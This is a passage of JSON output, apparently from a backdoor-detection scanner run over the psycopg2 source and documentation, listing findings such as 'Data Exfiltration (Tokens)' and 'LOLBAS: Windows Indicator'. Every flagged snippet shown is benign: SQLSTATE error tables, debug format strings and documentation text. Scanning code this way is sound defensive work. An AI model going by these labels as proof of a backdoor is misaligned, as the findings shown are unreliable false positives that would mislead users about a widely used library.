                  "startColumn": 10,
                  "endLine": 138,
                  "endColumn": 55,
                  "snippet": {
                    "text": "{\"25000\", \"InvalidTransactionState\"},\n{\"25001\", \"ActiveSqlTransaction\"},\n{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n",
                    "rendered": {
                      "text": "{\"25000\", \"InvalidTransactionState\"},\n{\"25001\", \"ActiveSqlTransaction\"},\n{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n",
                      "markdown": "`{\"25000\", \"InvalidTransactionState\"},\n{\"25001\", \"ActiveSqlTransaction\"},\n{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 10,
                  "endLine": 99,
                  "endColumn": 53,
                  "snippet": {
                    "text": "{\"2202G\", \"InvalidTablesampleRepeat\"},\n{\"2202H\", \"InvalidTablesampleArgument\"},\n{\"22030\", \"DuplicateJsonObjectKeyValue\"},\n{\"22031\", \"InvalidArgumentForSqlJsonDatetimeFunction\"},\n{\"22032\", \"InvalidJsonText\"},\n{\"22033\", \"InvalidSqlJsonSubscript\"},\n{\"22034\", \"MoreThanOneSqlJsonItem\"},\n",
                    "rendered": {
                      "text": "{\"2202G\", \"InvalidTablesampleRepeat\"},\n{\"2202H\", \"InvalidTablesampleArgument\"},\n{\"22030\", \"DuplicateJsonObjectKeyValue\"},\n{\"22031\", \"InvalidArgumentForSqlJsonDatetimeFunction\"},\n{\"22032\", \"InvalidJsonText\"},\n{\"22033\", \"InvalidSqlJsonSubscript\"},\n{\"22034\", \"MoreThanOneSqlJsonItem\"},\n",
                      "markdown": "`{\"2202G\", \"InvalidTablesampleRepeat\"},\n{\"2202H\", \"InvalidTablesampleArgument\"},\n{\"22030\", \"DuplicateJsonObjectKeyValue\"},\n{\"22031\", \"InvalidArgumentForSqlJsonDatetimeFunction\"},\n{\"22032\", \"InvalidJsonText\"},\n{\"22033\", \"InvalidSqlJsonSubscript\"},\n{\"22034\", \"MoreThanOneSqlJsonItem\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 10,
                  "endLine": 44,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n/* Class 0Z - Diagnostics Exception */\n{\"0Z000\", \"DiagnosticsException\"},\n{\"0Z002\", \"StackedDiagnosticsAccessedWithoutActiveHandler\"},\n\n/* Class 20 - Case Not Found */\n{\"20000\", \"CaseNotFound\"},\n",
                    "rendered": {
                      "text": "\n/* Class 0Z - Diagnostics Exception */\n{\"0Z000\", \"DiagnosticsException\"},\n{\"0Z002\", \"StackedDiagnosticsAccessedWithoutActiveHandler\"},\n\n/* Class 20 - Case Not Found */\n{\"20000\", \"CaseNotFound\"},\n",
                      "markdown": "`\n/* Class 0Z - Diagnostics Exception */\n{\"0Z000\", \"DiagnosticsException\"},\n{\"0Z002\", \"StackedDiagnosticsAccessedWithoutActiveHandler\"},\n\n/* Class 20 - Case Not Found */\n{\"20000\", \"CaseNotFound\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 10,
                  "endLine": 17,
                  "endColumn": 57,
                  "snippet": {
                    "text": "{\"08000\", \"ConnectionException\"},\n{\"08001\", \"SqlclientUnableToEstablishSqlconnection\"},\n{\"08003\", \"ConnectionDoesNotExist\"},\n{\"08004\", \"SqlserverRejectedEstablishmentOfSqlconnection\"},\n{\"08006\", \"ConnectionFailure\"},\n{\"08007\", \"TransactionResolutionUnknown\"},\n{\"08P01\", \"ProtocolViolation\"},\n",
                    "rendered": {
                      "text": "{\"08000\", \"ConnectionException\"},\n{\"08001\", \"SqlclientUnableToEstablishSqlconnection\"},\n{\"08003\", \"ConnectionDoesNotExist\"},\n{\"08004\", \"SqlserverRejectedEstablishmentOfSqlconnection\"},\n{\"08006\", \"ConnectionFailure\"},\n{\"08007\", \"TransactionResolutionUnknown\"},\n{\"08P01\", \"ProtocolViolation\"},\n",
                      "markdown": "`{\"08000\", \"ConnectionException\"},\n{\"08001\", \"SqlclientUnableToEstablishSqlconnection\"},\n{\"08003\", \"ConnectionDoesNotExist\"},\n{\"08004\", \"SqlserverRejectedEstablishmentOfSqlconnection\"},\n{\"08006\", \"ConnectionFailure\"},\n{\"08007\", \"TransactionResolutionUnknown\"},\n{\"08P01\", \"ProtocolViolation\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 156,
                  "startColumn": 18,
                  "endLine": 156,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n/* Class 28 - Invalid Authorization Specification */\n{\"28000\", \"InvalidAuthorizationSpecification\"},\n{\"28P01\", \"InvalidPassword\"},\n\n/* Class 2B - Dependent Privilege Descriptors Still Exist */\n{\"2B000\", \"DependentPrivilegeDescriptorsStillExist\"},\n",
                    "rendered": {
                      "text": "\n/* Class 28 - Invalid Authorization Specification */\n{\"28000\", \"InvalidAuthorizationSpecification\"},\n{\"28P01\", \"InvalidPassword\"},\n\n/* Class 2B - Dependent Privilege Descriptors Still Exist */\n{\"2B000\", \"DependentPrivilegeDescriptorsStillExist\"},\n",
                      "markdown": "`\n/* Class 28 - Invalid Authorization Specification */\n{\"28000\", \"InvalidAuthorizationSpecification\"},\n{\"28P01\", \"InvalidPassword\"},\n\n/* Class 2B - Dependent Privilege Descriptors Still Exist */\n{\"2B000\", \"DependentPrivilegeDescriptorsStillExist\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/typecast.c"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 38,
                  "endLine": 394,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        return NULL;\n    }\n\n    rv = PyString_FromFormat(\"<%s '%s' at %p>\",\n        Py_TYPE(self)->tp_name, Bytes_AS_STRING(name), self);\n\n    Py_DECREF(name);\n",
                    "rendered": {
                      "text": "        return NULL;\n    }\n\n    rv = PyString_FromFormat(\"<%s '%s' at %p>\",\n        Py_TYPE(self)->tp_name, Bytes_AS_STRING(name), self);\n\n    Py_DECREF(name);\n",
                      "markdown": "`        return NULL;\n    }\n\n    rv = PyString_FromFormat(\"<%s '%s' at %p>\",\n        Py_TYPE(self)->tp_name, Bytes_AS_STRING(name), self);\n\n    Py_DECREF(name);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pint.c"
                },
                "region": {
                  "startLine": 153,
                  "startColumn": 46,
                  "endLine": 153,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pint_dealloc: deleted pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pint_dealloc: deleted pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pint_dealloc: deleted pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pint.c"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 41,
                  "endLine": 139,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pint_setup: good pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pint_setup: good pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pint_setup: good pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pint.c"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 41,
                  "endLine": 131,
                  "endColumn": 45,
                  "snippet": {
                    "text": "static int\npint_setup(pintObject *self, PyObject *obj)\n{\n    Dprintf(\"pint_setup: init pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\npint_setup(pintObject *self, PyObject *obj)\n{\n    Dprintf(\"pint_setup: init pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\npint_setup(pintObject *self, PyObject *obj)\n{\n    Dprintf(\"pint_setup: init pint object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pdecimal.c"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 54,
                  "endLine": 179,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pdecimal_dealloc: deleted pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pdecimal_dealloc: deleted pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pdecimal_dealloc: deleted pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pdecimal.c"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 49,
                  "endLine": 165,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pdecimal_setup: good pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pdecimal_setup: good pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pdecimal_setup: good pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pdecimal.c"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 49,
                  "endLine": 157,
                  "endColumn": 53,
                  "snippet": {
                    "text": "static int\npdecimal_setup(pdecimalObject *self, PyObject *obj)\n{\n    Dprintf(\"pdecimal_setup: init pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\npdecimal_setup(pdecimalObject *self, PyObject *obj)\n{\n    Dprintf(\"pdecimal_setup: init pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\npdecimal_setup(pdecimalObject *self, PyObject *obj)\n{\n    Dprintf(\"pdecimal_setup: init pdecimal object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/cursor_type.c"
                },
                "region": {
                  "startLine": 2060,
                  "startColumn": 23,
                  "endLine": 2060,
                  "endColumn": 27,
                  "snippet": {
                    "text": "cursor_repr(cursorObject *self)\n{\n    return PyString_FromFormat(\n        \"<cursor object at %p; closed: %d>\", self, self->closed);\n}\n\nstatic int\n",
                    "rendered": {
                      "text": "cursor_repr(cursorObject *self)\n{\n    return PyString_FromFormat(\n        \"<cursor object at %p; closed: %d>\", self, self->closed);\n}\n\nstatic int\n",
                      "markdown": "`cursor_repr(cursorObject *self)\n{\n    return PyString_FromFormat(\n        \"<cursor object at %p; closed: %d>\", self, self->closed);\n}\n\nstatic int\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/cursor_type.c"
                },
                "region": {
                  "startLine": 2008,
                  "startColumn": 50,
                  "endLine": 2008,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n    CLEARPGRES(self->pgres);\n\n    Dprintf(\"cursor_dealloc: deleted cursor object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj));\n\n",
                    "rendered": {
                      "text": "\n    CLEARPGRES(self->pgres);\n\n    Dprintf(\"cursor_dealloc: deleted cursor object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj));\n\n",
                      "markdown": "`\n    CLEARPGRES(self->pgres);\n\n    Dprintf(\"cursor_dealloc: deleted cursor object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj));\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/cursor_type.c"
                },
                "region": {
                  "startLine": 1966,
                  "startColumn": 45,
                  "endLine": 1966,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        }\n    }\n\n    Dprintf(\"cursor_setup: good cursor object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "        }\n    }\n\n    Dprintf(\"cursor_setup: good cursor object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`        }\n    }\n\n    Dprintf(\"cursor_setup: good cursor object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/cursor_type.c"
                },
                "region": {
                  "startLine": 1920,
                  "startColumn": 45,
                  "endLine": 1920,
                  "endColumn": 49,
                  "snippet": {
                    "text": "static int\ncursor_setup(cursorObject *self, connectionObject *conn, const char *name)\n{\n    Dprintf(\"cursor_setup: init cursor object at %p\", self);\n    Dprintf(\"cursor_setup: parameters: name = %s, conn = %p\", name, conn);\n\n    if (name) {\n",
                    "rendered": {
                      "text": "static int\ncursor_setup(cursorObject *self, connectionObject *conn, const char *name)\n{\n    Dprintf(\"cursor_setup: init cursor object at %p\", self);\n    Dprintf(\"cursor_setup: parameters: name = %s, conn = %p\", name, conn);\n\n    if (name) {\n",
                      "markdown": "`static int\ncursor_setup(cursorObject *self, connectionObject *conn, const char *name)\n{\n    Dprintf(\"cursor_setup: init cursor object at %p\", self);\n    Dprintf(\"cursor_setup: parameters: name = %s, conn = %p\", name, conn);\n\n    if (name) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/cursor_type.c"
                },
                "region": {
                  "startLine": 1613,
                  "startColumn": 56,
                  "endLine": 1613,
                  "endColumn": 65,
                  "snippet": {
                    "text": "\"copy_expert(sql, file, size=8192) -- Submit a user-composed COPY statement.\\n\" \\\n\"`file` must be an open, readable file for COPY FROM or an open, writable\\n\"   \\\n\"file for COPY TO. The optional `size` argument, when specified for a COPY\\n\"   \\\n\"FROM statement, will be passed to file's read method to control the read\\n\"    \\\n\"buffer size.\"\n\nstatic PyObject *\n",
                    "rendered": {
                      "text": "\"copy_expert(sql, file, size=8192) -- Submit a user-composed COPY statement.\\n\" \\\n\"`file` must be an open, readable file for COPY FROM or an open, writable\\n\"   \\\n\"file for COPY TO. The optional `size` argument, when specified for a COPY\\n\"   \\\n\"FROM statement, will be passed to file's read method to control the read\\n\"    \\\n\"buffer size.\"\n\nstatic PyObject *\n",
                      "markdown": "`\"copy_expert(sql, file, size=8192) -- Submit a user-composed COPY statement.\\n\" \\\n\"`file` must be an open, readable file for COPY FROM or an open, writable\\n\"   \\\n\"file for COPY TO. The optional `size` argument, when specified for a COPY\\n\"   \\\n\"FROM statement, will be passed to file's read method to control the read\\n\"    \\\n\"buffer size.\"\n\nstatic PyObject *\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/cursor_type.c"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 31,
                  "endLine": 114,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    CLEARPGRES(self->pgres);\n\n    self->closed = 1;\n    Dprintf(\"curs_close: cursor at %p closed\", self);\n\n    rv = Py_None;\n    Py_INCREF(rv);\n",
                    "rendered": {
                      "text": "    CLEARPGRES(self->pgres);\n\n    self->closed = 1;\n    Dprintf(\"curs_close: cursor at %p closed\", self);\n\n    rv = Py_None;\n    Py_INCREF(rv);\n",
                      "markdown": "`    CLEARPGRES(self->pgres);\n\n    self->closed = 1;\n    Dprintf(\"curs_close: cursor at %p closed\", self);\n\n    rv = Py_None;\n    Py_INCREF(rv);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 15,
                  "endLine": 407,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    .. attribute:: itersize\n\n        Read/write attribute specifying the number of rows to fetch from the\n        backend at each network roundtrip during :ref:`iteration\n        <cursor-iterable>` on a :ref:`named cursor <server-side-cursors>`. The\n        default is 2000.\n\n",
                    "rendered": {
                      "text": "    .. attribute:: itersize\n\n        Read/write attribute specifying the number of rows to fetch from the\n        backend at each network roundtrip during :ref:`iteration\n        <cursor-iterable>` on a :ref:`named cursor <server-side-cursors>`. The\n        default is 2000.\n\n",
                      "markdown": "`    .. attribute:: itersize\n\n        Read/write attribute specifying the number of rows to fetch from the\n        backend at each network roundtrip during :ref:`iteration\n        <cursor-iterable>` on a :ref:`named cursor <server-side-cursors>`. The\n        default is 2000.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 20,
                  "endLine": 401,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n\n    .. attribute:: itersize\n",
                    "rendered": {
                      "text": "\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n\n    .. attribute:: itersize\n",
                      "markdown": "`\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n\n    .. attribute:: itersize\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 399,
                  "startColumn": 71,
                  "endLine": 399,
                  "endColumn": 75,
                  "snippet": {
                    "text": "\n    .. attribute:: arraysize\n\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n",
                    "rendered": {
                      "text": "\n    .. attribute:: arraysize\n\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n",
                      "markdown": "`\n    .. attribute:: arraysize\n\n        This read/write attribute specifies the number of rows to fetch at a\n        time with `~cursor.fetchmany()`. It defaults to 1 meaning to fetch\n        a single row at a time.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/cursor.rst"
                },
                "region": {
                  "startLine": 303,
                  "startColumn": 46,
                  "endLine": 303,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n        .. versionchanged:: 2.4\n            iterating over a :ref:`named cursor <server-side-cursors>`\n            fetches `~cursor.itersize` records at time from the backend.\n            Previously only one record was fetched per roundtrip, resulting\n            in a large overhead.\n\n",
                    "rendered": {
                      "text": "\n        .. versionchanged:: 2.4\n            iterating over a :ref:`named cursor <server-side-cursors>`\n            fetches `~cursor.itersize` records at time from the backend.\n            Previously only one record was fetched per roundtrip, resulting\n            in a large overhead.\n\n",
                      "markdown": "`\n        .. versionchanged:: 2.4\n            iterating over a :ref:`named cursor <server-side-cursors>`\n            fetches `~cursor.itersize` records at time from the backend.\n            Previously only one record was fetched per roundtrip, resulting\n            in a large overhead.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
